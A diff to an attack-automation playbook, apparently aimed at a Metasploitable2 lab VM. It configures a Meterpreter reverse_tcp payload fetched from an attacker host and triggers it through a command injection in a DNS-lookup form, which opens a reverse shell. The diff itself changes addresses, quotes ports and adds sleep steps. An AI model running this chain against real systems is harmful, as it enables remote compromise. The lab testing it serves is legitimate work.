@@ -15,10 +15,10 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
   PAYLOAD: cmd/linux/http/x86/meterpreter/reverse_tcp
-  LPORT: 4401
+  LPORT: "4401"
 
 commands:
   - type: mktemp
@@ -33,7 +33,7 @@ commands:
       LPORT: $LPORT
       FETCH_WRITABLE_DIR: /tmp
       FETCH_SRVHOST: $ATTACKER
-      FETCH_SRVPORT: 8080
+      FETCH_SRVPORT: "8080"
     format: raw
     local_path: ${RSHELL}
 
@@ -56,9 +56,13 @@ commands:
       LPORT: $LPORT
       FETCH_WRITABLE_DIR: /tmp
       FETCH_SRVHOST: $ATTACKER
-      FETCH_SRVPORT: 8080
+      FETCH_SRVPORT: "8080"
     background: true
+      #exit_on_error: false
     kill_on_exit: true
+
+  - type: sleep
+    seconds: 10
 
   # execute the command injection and trigger the reverse shell download
   - type: http-client
@@ -67,8 +71,13 @@ commands:
     data:
       target_host: $CMDSTAGE
       dns-lookup-php-submit-button: "Lookup+DNS"
-    background: true
-    kill_on_exit: true
+    background: false
+    exit_on_error: false
+      #kill_on_exit: true
+
+  - type: sleep
+    seconds: 10
+
 
   # execute a command via reverse shell
   - type: msf-session
